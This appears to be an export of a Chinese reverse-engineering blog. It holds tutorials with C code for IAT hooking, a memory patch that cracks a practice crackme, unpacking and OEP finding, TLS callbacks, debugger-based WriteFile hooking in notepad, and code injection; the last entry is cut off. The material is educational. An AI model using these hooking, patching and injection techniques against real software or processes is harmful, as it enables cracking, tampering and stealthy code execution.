它有两个参数，第一个为窗口句柄（hWnd），第二个参数为字符串指针（lpString）。阿拉伯数字字符串转换为中文数字字符串情形如下： 3、hook_iat()1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859BOOL hook_iat(LPCSTR szDllName, PROC pfnOrg, PROC pfnNew)&#123; HMODULE hMod; LPCSTR szLibName; PIMAGE_IMPORT_DESCRIPTOR pImportDesc; PIMAGE_THUNK_DATA pThunk; DWORD dwOldProtect, dwRVA; PBYTE pAddr; // hMod, pAddr = ImageBase of calc.exe // = VA to MZ signature (IMAGE_DOS_HEADER) hMod = GetModuleHandle(NULL); pAddr = (PBYTE)hMod; // pAddr = VA to PE signature (IMAGE_NT_HEADERS) pAddr += *((DWORD*)&amp;pAddr[0x3C]); // dwRVA = RVA to IMAGE_IMPORT_DESCRIPTOR Table dwRVA = *((DWORD*)&amp;pAddr[0x80]); // pImportDesc = VA to IMAGE_IMPORT_DESCRIPTOR Table pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)hMod+dwRVA); for( ; pImportDesc-&gt;Name; pImportDesc++ ) &#123; // szLibName = VA to IMAGE_IMPORT_DESCRIPTOR.Name szLibName = (LPCSTR)((DWORD)hMod + pImportDesc-&gt;Name); if( !_stricmp(szLibName, szDllName) ) &#123; // pThunk = IMAGE_IMPORT_DESCRIPTOR.FirstThunk // = VA to IAT(Import Address Table) pThunk = (PIMAGE_THUNK_DATA)((DWORD)hMod + pImportDesc-&gt;FirstThunk); // pThunk-&gt;u1.Function = VA to API for( ; pThunk-&gt;u1.Function; pThunk++ ) &#123; if( pThunk-&gt;u1.Function == (DWORD)pfnOrg ) &#123; VirtualProtect((LPVOID)&amp;pThunk-&gt;u1.Function, 4, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect); pThunk-&gt;u1.Function = (DWORD)pfnNew; VirtualProtect((LPVOID)&amp;pThunk-&gt;u1.Function, 4, dwOldProtect, &amp;dwOldProtect); return TRUE; &#125; &#125; &#125; &#125; return FALSE;&#125; hook_iat()函数的前半部分用来读取PE文件头信息，并查找IAT的位置。 12345hMod = GetModuleHandle(NULL); // hMod = ImageBase pAddr = (PBYTE)hMod; // pAddr = IMAGE_NT_HEADERS pAddr += *((DWORD*)&amp;pAddr[0x3C]); // pAddr = &quot;PE&quot; signature dwRVA = *((DWORD*)&amp;pAddr[0x80]); // dwRVA = VA to IMAGE_IMPORT_DESCRIPTOR Table pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)hMod+dwRVA); 找到IMAGE_IMPORT_DESCRIPTOR表后，用for循环遍历，查找user32.dll的IAT。pImportDesc-&gt;FirstThunk成员所指的就是IAT。然后再循环遍历，查找SetWindowTextW的位置。找到后，修改为MySetWindowTextW的地址。 1pThunk-&gt;u1.Function = (DWORD)pfnNew; 这样，计算器代码调用user32.SetWindowTextW()API时，实际会先调用hookiat.MySetWindowTextW()函数。]]></content>
  </entry>
  <entry>
    <title><![CDATA[破解补丁]]></title>
    <url>%2F2020%2F05%2F06%2F%E7%A0%B4%E8%A7%A3%E8%A1%A5%E4%B8%81%2F</url>
    <content type="text"><![CDATA[1、程序实例Cosh.1.exe破解前：破解后： 2、查找打补丁地址通过字符串搜索，可以定位到关键点。 12地址 硬编码 汇编代码0040138C 0F84 F3000000 je Cosh.1.00401485 如果比较结果为相等，则跳转，输出字符串“Well done，Cracker”。将跳转指令je改成jmp，实现无条件跳转，输出“Well done，Cracker”。 123地址 硬编码 汇编代码0040138C E9 F4000000 jmp Cosh.1.0040148500401391 90 nop 通过上面过程可以看出只要将内存地址0x0040138C处的6个字节0F 84 F3 00 00 00改成E9 F4 00 00 00 90就能达到破解目的。 3、代码实现1、实现这个功能首先我们需要了解几个API。1、CreateToolhelp32Snapshot()能获得系统进程快照的句柄。 123456HANDLEWINAPICreateToolhelp32Snapshot( DWORD dwFlags, DWORD th32ProcessID ); 2、Heap32ListFirst()查找系统进程快照中的第一个进程。 123456BOOLWINAPIHeap32ListFirst( HANDLE hSnapshot, LPHEAPLIST32 lphl ); 3、Process32Next()获得下一个进程。 123456BOOLWINAPIProcess32Next( HANDLE hSnapshot, LPROCESSENTRY32 lppe ); 4、tagPROCESSENTRY32结构体能够保存进程的信息。 123456789101112131415typedef struct tagPROCESSENTRY32&#123; DWORD dwSize; DWORD cntUsage; DWORD th32ProcessID; // this process ULONG_PTR th32DefaultHeapID; DWORD th32ModuleID; // associated exe DWORD cntThreads; DWORD th32ParentProcessID; // this process&apos;s parent process LONG pcPriClassBase; // Base priority of process&apos;s threads DWORD dwFlags; CHAR szExeFile[MAX_PATH]; // Path&#125; PROCESSENTRY32;typedef PROCESSENTRY32 * PPROCESSENTRY32;typedef PROCESSENTRY32 * LPPROCESSENTRY32; 4、OpenProcess()用来打开一个已存在的进程对象，并返回进程的句柄。 12345678WINBASEAPIHANDLEWINAPIOpenProcess( _In_ DWORD dwDesiredAccess, _In_ BOOL bInheritHandle, _In_ DWORD dwProcessId ); 5、WriteProcessMemory()对内存区域进行读写。 1234567891011WINBASEAPI_Success_(return != FALSE)BOOLWINAPIWriteProcessMemory( _In_ HANDLE hProcess, _In_ LPVOID lpBaseAddress, _In_reads_bytes_(nSize) LPCVOID lpBuffer, _In_ SIZE_T nSize, _Out_opt_ SIZE_T* lpNumberOfBytesWritten ); 2、代码先在系统中查找需要打补丁程序的进程名与进程ID，然后通过WriteProcessMemory()函数对内存进行读写，将内存地址0x0040138C处的6个字节0F 84 F3 00 00 00改成E9 F4 00 00 00 90。 12345678910111213141516171819202122232425262728293031323334353637#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;#include &lt;TlHelp32.h&gt;int main()&#123; HANDLE hProceessnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);//创建进程快照 if (hProceessnap == INVALID_HANDLE_VALUE) &#123; printf(&quot;创建进行快照失败\n&quot;); return -1; &#125; else &#123; PROCESSENTRY32 pe32; byte Patch[] = &#123; 0xE9, 0xF4, 0x00, 0x00, 0x00, 0x90 &#125;;//补丁数据 pe32.dwSize = sizeof(pe32); BOOL hProcess = Process32First(hProceessnap, &amp;pe32); char buff[1024]; char name[26] = &quot;Cosh.1.exe&quot;;//要打补丁程序的进程名 while (hProcess) &#123; if (_stricmp(pe32.szExeFile, name) == 0)//进行比较 &#123; HANDLE hHandle = OpenProcess(PROCESS_ALL_ACCESS, TRUE, pe32.th32ProcessID);//获得进程句柄 WriteProcessMemory(hHandle, (LPVOID)0x0040138C, Patch, 6, NULL);//写入内存 MessageBoxA(0, &quot;成功！&quot;, &quot;补丁&quot;, 0); break; &#125; memset(buff, 0x00, 1024); hProcess = Process32Next(hProceessnap, &amp;pe32); &#125; &#125; CloseHandle(hProceessnap); system(&quot;pause&quot;); return 0;&#125; 将程序Cosh.1.exe运行，再运行编译成功的补丁程序。通过Windbg的附加功能，我们可以看到，地址0x0040138C处的六个字节代码已经呗更改，破解成功。]]></content>
  </entry>
  <entry>
    <title><![CDATA[脱壳技术——寻找OEP]]></title>
    <url>%2F2020%2F04%2F09%2F%E8%84%B1%E5%A3%B3%E6%8A%80%E6%9C%AF%E2%80%94%E2%80%94%E5%AF%BB%E6%89%BEOEP%2F</url>
    <content type="text"><![CDATA[1、根据栈平衡原理寻找OEP在编写加壳软件时，必须保证外壳初始化的现场环境（各寄存器的值）与原程序的现场环境是相同的。加壳程序在初始化时保存各寄存器的值，待外壳执行完毕恢复各寄存器的内容，最后跳转到原程序执行。通常用pushad/popad，pushfd/popfd指令对来保存与恢复现场环境。下面我们来脱一下示例文件RebPE的壳。程序刚加载时的寄存器和堆栈。在执行pushad指令后，各寄存器的值将被压入19FF54h~19FF70h的栈中。此时esp指向19FF54h。对这个地址设置硬件访问断点：hr 19FF54。按“F9”键运行程序。外壳代码处理结束后，再调用popad指令恢复现场环境。在按“F8”单步来到401130h这一行，会发现寄存器恢复pushad前的状态。执行完retn指令后，跳转到OEP。 2、用内存访问断点寻找OEP外壳先将压缩的代码并释放到对应的区块上，处理完毕再跳转到代码段执行。当对代码段设置内存访问断点时，一定会中断在外壳对代码进行读取的那句指令上。按“Alt+M”组合键打开内存模块，对代码段按F2键设置内存访问断点。对.txt区块设置内存访问断点后，按“F9”键运行程序，程序将中断在如下代码处。上面这段代码是解压函数，走出这个函数，将来到外壳代码处，具体如下。这段代码依次将区块解压并放到正确位置。将代码段全部解压后，对代码段（.txt区块）设置内存访问断点。按“F9”键执行程序，程序将在OEP处中断。还可以通过先在.rdata、.data等区块处设置内存访问断点，待程序中断，代码已解压，再对代码段设置内存访问断点，到达OEP。]]></content>
  </entry>
  <entry>
    <title><![CDATA[脱壳技术——基础知识篇]]></title>
    <url>%2F2020%2F04%2F08%2F%E8%84%B1%E5%A3%B3%E6%8A%80%E6%9C%AF%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E7%AF%87%2F</url>
    <content type="text"><![CDATA[壳和病毒在某些方面类似，都需要比原程序代码更早地获取控制权。壳修改了原程序文件的组织结构，从而能够比原程序早获得控制权，而且不影响原程序的正常执行。 1、保存入口参数加载程序在初始化时会保存各寄存器的值，待外壳执行完毕，再恢复各寄存器的内容，最后跳转到原程序执行。通常用pushad/popad、pushfd/popfd指令对来保存与恢复现场环境。 2、获取壳本身需要的API地址在一般情况下，外壳的输入表中只有GetProcAddress、GetModuleHandle和LoadLibrary这三个API函数，甚至只有kernel32.dll和GetProcAddress。如果需要使用其他API函数，可以通过函数LoadLibraryA(W)或LoadLibraryExA(W)将DLL文件映像映射到调用进程的地址空间中，函数返回的HINSTANCE值用于标识文件影响所映射的虚拟内存地址。LoadLibrary函数的原型如下。 123HINSTANCE LoadLibrary( LPCTSTR lpLibFileName); 如果DLL文件已经被映射到调用进程的地址空间中，可以调用GetModuleHandleA(W)函数获取DLL模块句柄。函数原型如下。 123HINSTANCE GetModuleHandleA(W)( LPCTSTR lpLibFileName); 一旦DLL模块被加载，线程就可以调用GetProcAddress函数获取输入函数的地址了。函数原型如下。 1234FARPROC GetProcAddress( HMODULE hModule, LPCSTR lpProcName); 3、解密原程序各个区块的数据出于保护原程序代码和数据的目的，壳一般会加密原程序文件的各个区块。在执行程序时，外壳将解密这些区块，从而使程序能够正常运行。 4、IAT初始化IAT的填写本来由PE装载器实现，但由于在加壳时构造了一个自建输入表，并让PE文件头数据目录表中的输入表指针指向自建的输入表，PE装载器会对自建的输入表进行填写。程序的原始输入表被外壳变形后存储，IAT的填写会由外壳程序实现。外壳要做的就是将这个变形输入表的结构从头到尾扫描一遍，重新获取每一个DLL引入的所以函数的地址，并将其填写在IAT中。 5、重定位项的处理因为Windows操作系统没办法保证在DLL每次运行时都提供相同的基地址，因此在壳中也要有用于“重定位”的代码，否则原程序中的代码无法正常运行。 6、Hook API在程序文件中，输入表的作用是让Windows操作系统在程序运行时将API的实际地址提供给程序使用。壳大都在修改原程序文件的输入表后自己模仿Windows操作系统的工作流程，向输入表中填充相关的数据。在填充过程中，外壳可以填充Hook API代码的地址，从而间接获得程序的控制权。 7、跳转到程序原入口点壳将控制权还给原程序。]]></content>
  </entry>
  <entry>
    <title><![CDATA[TLS回调函数]]></title>
    <url>%2F2020%2F04%2F06%2FTLS%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0%2F</url>
    <content type="text"><![CDATA[代码逆向分析领域中，TLS（Thread Local Storage，线程局部存储）回调函数（Callback Function）常用于反调试。TLS回调函数的调用运行要先于EP代码的执行，该特征使它可以作为一种反调试技术使用。 1、程序：HelloTls.exe运行练习程序文件（HelloTls.exe），弹出1一个消息框，单机“确定”按钮后，程序终止运行。下面使用OllyDbg调试练习示例程序。在OllyDbg调试器中打开并运行HelloTls。.exe文件，弹出如下对话框。点击确定，按钮，进程终止。 2、TLS1、IMAFGE_DATA_DIRECTORY[9]若在编程中启用了TLS功能，PE头文件中就会设置TLS表（TLS Table）项目。2、IMAGE_TLS_DIRECTORY 12345678910111213141516171819202122232425262728typedef struct _IMAGE_TLS_DIRECTORY64 &#123; ULONGLONG StartAddressOfRawData; ULONGLONG EndAddressOfRawData; ULONGLONG AddressOfIndex; ULONGLONG AddressOfCallBacks; DWORD SizeOfZeroFill; DWORD Characteristics;&#125; IMAGE_TLS_DIRECTORY64；typedef IMAGE_TLS_DIRECTORY64 * PIMAGE_TLS_DIRECTORY64;typedef struct _IMAGE_TLS_DIRECTORY32 &#123; DWORD StartAddressOfRawData; DWORD EndAddressOfRawData; DWORD AddressOfIndex; DWORD AddressOfCallBacks; DWORD SizeOfZeroFill; DWORD Characteristics;&#125; IMAGE_TLS_DIRECTORY32；typedef IMAGE_TLS_DIRECTORY32 * PIMAGE_TLS_DIRECTORY32;#ifdef _WIN64typedef IMAGE_TLS_DIRECTORY64 IMAGE_TLS_DIRECTORY64；typedef PIMAGE_TLS_DIRECTORY64 PIMAGE_TLS_DIRECTORY64;#elsetypedef IMAGE_TLS_DIRECTORY32 IMAGE_TLS_DIRECTORY32；typedef PIMAGE_TLS_DIRECTORY32 PIMAGE_TLS_DIRECTORY32; IMAGE_TLS_DIRECTORY结构体有两种版本，分别为32位与64位。使用工具查看IMAGE_TLS_DIRECTORY结构体，如图所示。3、回调函数地址数组该数组中实际存储的就是TLS回调函数的地址。进程启动时，系统会逐一调用存储在该数组中的函数。 3、TLS回调函数创建或终止某线程时，TLS回调函数都会自动调用执行，前后共两次。TLS回调函数的定义代码如下。 123456typedef VOID(NTAPI *PIMAGE_TLS_CALLBACK) ( PVOID DllHandle, DWORD Reason, PVOID Reserved);]]></content>
  </entry>
  <entry>
    <title><![CDATA[x64处理器]]></title>
    <url>%2F2020%2F04%2F04%2Fx64%E5%A4%84%E7%90%86%E5%99%A8%2F</url>
    <content type="text"><![CDATA[1、64位64位系统中内存地址为64位（8个字节），使用64位大小的指针。所以含有绝对地址（VA）的指令大小比原来增加了4个字节。同样，寄存器的大小以及栈的基本单位也变成64位。 2、内存x64系统中进程虚拟内存的实际大小为16TB。 3、通用寄存器x64系统中，通用寄存器的大小扩展到64位，数量也增加到18个。所有通用寄存器的名称均以字母“R”开头。为了向下兼容，支持访问寄存器的8位、16位、32位。 4、CALL/JMP指令地址指令由原来的4个字节变成8个字节，为了防止指令长度增加，x64系统中指令后面仍然跟着4个字节大小的地址，只不过该地址被解析为“相对地址”（RVA）。说明： 5、函数调用约定32位系统中使用的函数调用约定包括cdecl、stdcall、fastcall等几种，但64位系统中它们统一为一种变形的fastcall。64位fastcall中最多可以把函数的4个参数存储到寄存器中传递。各参数顺序由寄存器确定。若函数的参数超过4个，则与栈并用。 6、栈&amp;栈帧调用子函数时，不再用PUSH命令来传递参数，而是通过MOV指令操作寄存器与预定的栈来传递。并且创建栈帧时也不再使用RBP寄存器，而是直接使用RSP寄存器来实现。这样能大幅度提升程序的运行速度]]></content>
  </entry>
  <entry>
    <title><![CDATA[记事本WriteFile() API钩取]]></title>
    <url>%2F2020%2F03%2F30%2F%E8%AE%B0%E4%BA%8B%E6%9C%ACWriteFile()%20API%E9%92%A9%E5%8F%96%2F</url>
    <content type="text"><![CDATA[1、调试技术流程具体调试流程如下： 1、对想钩取的进程进行附加操作，使之成为被调试者； 2、“钩子”：将API起始地址的第一个字节修改为0xCC； 3、调用相应API时，控制权转移到调试器； 4、执行需要的操作（操作参数、返回值等）； 5、脱钩：将0xCC恢复原值； 6、运行相应API（无0xCC的正常状态）； 7、“钩子”：再次修改为0xCC（为了继续钩取）； 8、控制器返还被调试者。以上是最简单的情形，在此基础上可以有多种变化。 2、记事本WriteFile() API钩取首先运行Notepad.exe，获取其PID。运行钩取程序（hookdbg.exe）。hookdbg.exe是基于控制台的程序，其运行参数为目标进程的PID，运行hookdbg.exe程序后，就开始了对notepad进程的WriteFile() API的钩取，如图所示。然后在notepad中随意输入一下英文小写字母，如图所示。完成输入后保存，notepad界面中不会有任何变化。关闭notepad，查看hookdbg程序的控制台窗口，如图所示。打开保存的txt文件，查看实际文本是以大写字母形式保存。 3、工作原理WriteFile()定义： 1234567BOOL WriteFile( HANDLE hFile, LPCVOID lpBuffer, //数据缓冲区指针 DWORD nNumberOfBytesToWrote, //要写的字节数 LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped); 使用OllyDbg打开notepad后，在Kernel32!WriteFile() API处设置断点，按（F9）键运行程序。在记事本中输入文本后，以合适的文件名保存，在OllyDbg代码窗口中可以看到，调试器在kernel32!WriteFile()处暂停，然后查看进程，发现当前栈中存在一个返回值，ESP+8中存在数据缓冲区的地址。直接转到数据缓冲区地址处，可以看到要保存到notepad的字符串。钩取WriteFile() API后，用指定字符串覆盖数据缓冲区中的字符串即可达成所愿。 4、源代码分析1、main()12345678910111213141516171819202122int main(int argc, char * argv[])&#123; DWORD dwPID; if(argc != 2) &#123; printf(&quot;\nUSAGE : hookdbg.exe &lt;pid&gt;\n&quot;); return 1; &#125; dwPID = atoi(argv[1]); if(!DebugActiveProcess(dwPID)) &#123; printf(&quot;DebugActiveProcess(%d) failed!!!\n&quot; &quot;Error Code = %d\n&quot;, dwPID, GetLastError()); return 1; &#125; DebugLoop(); return 0;&#125; main()函数以程序运行参数的形式接收要钩取API的进程的PID，然后通过DebugActiveProcess() API将调试器附加到该运行的进程上，开始调试。 123BOOL WINAPI DebugActiveProcess( DWORD dwProcessId); 然后进入DebugLoop()函数，处理来自被调试者的调试事件。 2、DebugLoop()12345678910111213141516171819202122232425262728void DebugLoop()&#123; DEBUG_EVENT de; DWORD dwContinueStatus; //等待被调试者发生事件 while(WaitForDebugEvent(&amp;de, INFINITE)) &#123; dwContinueStatus = DBG_CONTINUE; //被调试进程生成或者附加事件 if(CREATE_PROCESS_DEBUD_EVENT == de.dwDebugEventCode) &#123; OnCreateProcessDebugEvent(&amp;de); &#125; //异常事件 else if( EXCEPTION_DEBUG_EVENT == de.dwDebugEventCode ) &#123; if( OnExceptionDebugEvent(&amp;de) ) continue; &#125; //被调试进程终止事件 else if( EXIT_PROCESS_DEBUG_EVENT == de.dwDebugEventCode ) &#123; break; &#125; //再次运行被调试者 ContinueDebugEvent(de.dwProcessId, de.dwThreadId, dwContinueStatus); &#125;&#125; DebugLoop()函数的工作原理类似于窗口过程函数，它从被调试者处接收事件并处理，然后被调试事件者继续运行。WaitForDebugEvent() API是一个等待被调试者发生调试事件的函数。 1234BOOL WINAPI WaitForDebugEvent( LPDEBUG_EVENT lpDebugEvent, DWORD dwMilliseconds); DebugLoop()函数代码中，若发生调试事件，WaitForDebugEvent() API就会将相关事件信息设置到其第一个参数的变量（DEBUG_EVENT结构体对像），然后立刻返回。 1234567891011121314151617typedef struct _DEBUG_EVENT &#123; // de DWORD dwDebugEventCode; DWORD dwProcessId; DWORD dwThreadId; union &#123; EXCEPTION_DEBUG_INFO Exception; CREATE_THREAD_DEBUG_INFO CreateThread; CREATE_PROCESS_DEBUG_INFO CreateProcessInfo; EXIT_THREAD_DEBUG_INFO ExitThread; EXIT_PROCESS_DEBUG_INFO ExitProcess; LOAD_DLL_DEBUG_INFO LoadDll; UNLOAD_DLL_DEBUG_INFO UnloadDll; OUTPUT_DEBUG_STRING_INFO DebugString; RIP_INFO RipInfo; &#125; u; &#125; DEBUG_EVENT; ContinueDebugEvent() API是一个使被调试者继续运行的函数。 12345678BOOL ContinueDebugEvent(DWORD dwProcessId, // process to continueDWORD dwThreadId, // thread to continueDWORD dwContinueStatus // continuation status); DebugLoop()函数处理三种调试事件，如下所示。 1、EXIT_PROCESS_DEBUG_EVENT 2、CREATE_PROCESS_DEBUG_EVENT 3、EXCEPTION_DEBUG_EVENT3、EXIT_PROCESS_DEBUG_EVENT被调试进程终止时会插发该事件。 4、CREATE_PROCESS_DEBUG_EVENT（OnCreateProcessDebugEvent()）OnCreateProcessDebugEvent()是CREATE_PROCESS_DEBUG_EVENT事件句柄，被调试进程启动时即调用执行该函数。 123456789101112BOOL OnCreateProcessDebugEvent(LPDEBUG_EVENT pde)&#123; //获取WriteFile() API地址 g_pfWriteFile = GetProcAddress(GetModuleHandleA(&quot;kernel32.dll&quot;), &quot;WriteFile&quot;); //更改第一个字节为0xCC（INT3），originalbyte是g_ch0rgByte备份 memcpy(&amp;g_cpdi, &amp;pde-&gt;u.CreateProcessInfo, sizeof(CREATE_PROCESS_DEBUG_INFO)); ReadProcessMemory(g_cpdi.hProcess, g_pfWriteFile, &amp;g_OrgByte, sizeof(BYTE), NULL); WriteProcessMemory(g_cpdi.hProcess, g_pfWriteFile, &amp;g_chINT3, sizeof(BYTE), NULL); return TRUE;&#125; 首先获取WriteFile() API的起始地址，它获取的不是被调试进程的内存地址，而是调试进程的内存地址。对于Windows OS的系统而言，它们在所有进程中都会加载到相同地址。g_cpdi是CREATE_PROCESS_DEBUG_INFO结构体变量。 123456789101112typedef struct _CREATE_PROCESS_DEBUG_INFO &#123; // cpdi HANDLE hFile; HANDLE hProcess; HANDLE hThread; LPVOID lpBaseOfImage; DWORD dwDebugInfoFileOffset; DWORD nDebugInfoSize; LPVOID lpThreadLocalBase; LPTHREAD_START_ROUTINE lpStartAddress; LPVOID lpImageName; WORD fUnicode; &#125; CREATE_PROCESS_DEBUG_INFO; 通过CREATE_PROCESS_DEBUG_INFO结构体的hProcess成员，可以钩取WriteFile() API。由于调试器拥有被调试进程的句柄，所以可以使用ReadProcessMemory()、WriteProcessMemory() API对被调试进程的内存空间自由进行读写操作。通过ReadProcessMemory()读取WriteFile() API的第一个字节，将其保存到g_chOrgByte变量，后面脱钩会用到。然后用WriteProcessMemory() API的第一个字节更改为0xCC，将控制权转移到调试器。 5、EXCEPTION_DEBUG_EVENT（OnExceptionDebugEvent()）OnExceptionDebugEvent()是EXCEPTION_DEBUG_EVENT事件句柄，它处理被调试者的INT3指令。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465BOOL OnExceptionDebugEvent(LPDEBUG_EVENT pde)&#123; CONTEXT ctx; PBYTE lpBuff = NULL; DWORD dwNumOfBytesToWrite, dwAddress; PEXCEPTION_RECORD per = &amp;pde-&gt;u.Exception.ExpectionRecord; //断点异常时 if(EXCEPTION_BREAKPOINT == per-&gt;ExceptionCode) &#123; //断点地址为WriteFile() API地址时 if(g_pfWriteFile == per-&gt;ExceptionAddress) &#123; //Unhook，将0xCC恢复为original byte WriteProcessMemory(g_cpdi.hProcess, g_pfWriteFile, &amp;g_chOrgByte, sizeof(BYTE), NULL); //获取线程上下文 ctx.ContextFlags = CONTEXT_CONTROL; GetThreadContext(g_cpdi.hThead, &amp;ctx); //获取WriteFile()的param 2、3值，param 2 = ESP + 0x8、param 3 = ESP + 0xC ReadProcessMemory(g_cpdi.hProcess, (LPVOID)(ctx.Esp + 0x8), &amp;dwAddrOfBuffer, sizeof(DWORD), NULL); ReadProcessMemory(g_cpdi.hProcess, (LPVOID)(ctx.Esp +0xC), &amp;dwNumOfBytesToWrite, sizeof(DWORD), NULL); //分配临时缓冲区 lpBuffer = (PBYTE)malloc(dwNumOfBytesToWrite+1); memset(lpBuffer, 0, dwNumOfBytesToWrite+1); //复制WriteFile()缓冲区到临时缓冲区 ReadProcessMemory(g_cpdi.hProcess, (LPVOID)dwAddrOfBuffer, lpBuffer, dwNumOfBytesToWrite, NULL); printf(&quot;\n### original string ###\n%s\n&quot;, lpBuffer); //将小写字母转换为大写字母 for( i = 0; i &lt; dwNumOfBytesToWrite; i++ ) &#123; if( 0x61 &lt;= lpBuffer[i] &amp;&amp; lpBuffer[i] &lt;= 0x7A ) lpBuffer[i] -= 0x20; &#125; printf(&quot;\n### converted string ###\n%s\n&quot;, lpBuffer); //将变换后的缓冲区复制到WriteFile()缓冲区 WriteProcessMemory(g_cpdi.hProcess, (LPVOID)dwAddrOfBuffer, lpBuffer, dwNumOfBytesToWrite, NULL); //释放临时缓冲区 free(lpBuffer); //将线程上下文的EIP更改为WriteFile()的首地址 ctx.Eip = (DWORD)g_pfWriteFile; SetThreadContext(g_cpdi.hThread, &amp;ctx); //运行被调试进程 ContinueDebugEvent(pde-&gt;dwProcessId, pde-&gt;dwThreadId, DBG_CONTINUE); Sleep(0); //API&quot;钩子&quot; WriteProcessMemory(g_cpdi.hProcess, g_pfWriteFile, &amp;g_chINT3, sizeof(BYTE), NULL); return TRUE; &#125; &#125; return FALSE;&#125; 1、“脱钩”首先需要“脱钩”，在将小写字母转换为大写字母后需要正常调用WriteFile()函数。 12//Unhook，将0xCC恢复为original byteWriteProcessMemory(g_cpdi.hProcess, g_pfWriteFile, &amp;g_chOrgByte, sizeof(BYTE), NULL); 2、获取线程上下文再次运行先前线程时，必须有运行所需的信息，这些重要信息指的就是CPU中各寄存器的值。通过这些值，才能保证CPU能够再次准确运行它。负责保存CPU寄存器信息的就是CONTEXT结构体，它的定义如下。 123456789101112131415161718192021222324252627282930313233typedef struct _CONTEXT&#123; DWORD ContextFlags // -| +00h DWORD Dr0 // | +04h DWORD Dr1 // | +08h DWORD Dr2 // &gt;调试寄存器 +0Ch DWORD Dr3 // | +10h DWORD Dr6 // | +14h DWORD Dr7 // -| +18h FLOATING_SAVE_AREA FloatSave; //浮点寄存器区 +1Ch~~~88h DWORD SegGs //-| +8Ch DWORD SegFs // |\段寄存器 +90h DWORD SegEs // |/ +94h DWORD SegDs //-| +98h DWORD Edi //________ +9Ch DWORD Esi // | 通用 +A0h DWORD Ebx // | 寄 +A4h DWORD Edx // | 存 +A8h DWORD Ecx // | 器 +ACh DWORD Eax //_|___组_ +B0h DWORD Ebp //++++++ +B4h DWORD Eip // |控制 +B8h DWORD SegCs // |寄存 +BCh DWORD EFlag // |器组 +C0h DWORD Esp // | +C4h DWORD SegSs //++++++ +C8h BYTE ExtendedRegisters[MAXIMUM_SUPPORTED_EXTENSION];&#125; CONTEXT; 下面是获取线程上下文的代码。 12ctx.ContextFlags = CONTEXT_CONTROL;GetThreadContext(g_cpdi.hThead, &amp;ctx); 像这样调用GetThreadContext() API，即可将指定线程的CONTEXT存储到ctx结构体变量。 123456BOOL GetThreadContext(HANDLE hThread, // handle of thread with contextLPCONTEXT lpContext // address of context structure); 3、获取WriteFile()的param2、3的值调用WriteFile()函数时，我们要在传递过来的参数中知道param2（数据缓冲区地址）与param3（缓冲区大小）这两个参数。通过CONTEXT.Esp成员可以分别获得它们的值。 12345//获取WriteFile()的param 2、3值，param 2 = ESP + 0x8、param 3 = ESP + 0xC ReadProcessMemory(g_cpdi.hProcess, (LPVOID)(ctx.Esp + 0x8), &amp;dwAddrOfBuffer, sizeof(DWORD), NULL);ReadProcessMemory(g_cpdi.hProcess, (LPVOID)(ctx.Esp +0xC), &amp;dwNumOfBytesToWrite, sizeof(DWORD), NULL); 4、把小写字母转换为大写字母后覆写WriteFile()缓冲区获取数据缓冲区的地址与大小后，将其内容读到调试器的内存空间，把小写字母转换为大写字母。然后将修改后的大写字母覆写到原位置。 12345678910111213141516171819202122//分配临时缓冲区lpBuffer = (PBYTE)malloc(dwNumOfBytesToWrite+1);memset(lpBuffer, 0, dwNumOfBytesToWrite+1);//复制WriteFile()缓冲区到临时缓冲区 ReadProcessMemory(g_cpdi.hProcess, (LPVOID)dwAddrOfBuffer, lpBuffer, dwNumOfBytesToWrite, NULL);printf(&quot;\n### original string ###\n%s\n&quot;, lpBuffer);//将小写字母转换为大写字母for( i = 0; i &lt; dwNumOfBytesToWrite; i++ )&#123; if( 0x61 &lt;= lpBuffer[i] &amp;&amp; lpBuffer[i] &lt;= 0x7A ) lpBuffer[i] -= 0x20;&#125;printf(&quot;\n### converted string ###\n%s\n&quot;, lpBuffer);//将变换后的缓冲区复制到WriteFile()缓冲区WriteProcessMemory(g_cpdi.hProcess, (LPVOID)dwAddrOfBuffer, lpBuffer, dwNumOfBytesToWrite, NULL); //释放临时缓冲区free(lpBuffer); 5、把线程上下文的EIP修改为WriteFile()起始地址修改好CONTEXT.Eip成员后，调用SetThreadContext() API。 12//将线程上下文的EIP更改为WriteFile()的首地址ctx.Eip = (DWORD)g_pfWriteFile; SetThreadContext(g_cpdi.hThread, &amp;ctx); 6、运行调试进程调用ContinueDebugEvent() API可以重启进程，使之继续运行。7、设置API“钩子”最后设置API“钩子”，方便下次钩取操作。]]></content>
  </entry>
  <entry>
    <title><![CDATA[代码注入]]></title>
    <url>%2F2020%2F03%2F25%2F%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[1、代码注入代码注入是一种向目标进程插入独立运行代码并使之运行的技术，它一般调用CreateRemoteThread() API以远程线程形式运行插入的代码，所以也被称为线程注入。原理如图所示：首先向目标进程插入代码于=与数据，在此过程中，代码以线程过程（Thread Procedure）形式插入，二代码中使用的数据则以线程参数的形式传入。也就是说，代码与数据是分别注入的。使用代码注入的原因：1、占用内存少如果要注入的代码与数据较少，那么就不需要讲它们做成DLL的形式注入。采用直接代码注入的方式同样能够获得与DLL注入相同的效果，且占用的内存会更少。2、难以查找痕迹采用DLL注入方式会在目标进程的内存中留下相关的痕迹，采用代码注入方式几乎不会留下任何痕迹。DLL注入技术主要用在代码量大且复杂的时候，而代码注入技术则适合用于代码量较少的情况。 2、注入示例1、运行notepad.exe首先运行notepad.exe，然后查看进程的PID，如图所示：2、运行CodeInjection.exe在命令行窗口输入命令与参数（notepad.exe的PID），回车运行：3、弹出消息框notepad.exe进程中弹出一个消息框，如图所示： 3、代码1、main()函数首先看一下main()函数。 1234567891011121314151617181920int main(int argc, char *argv[])&#123; DWORD dwPID = 0; if( argc != 2 ) &#123; printf(&quot;\n USAGE : %s &lt;pid&gt;\n&quot;, argv[0]); return 1; &#125; // change privilege if( !SetPrivilege(SE_DEBUG_NAME, TRUE) ) return 1; // code injection dwPID = 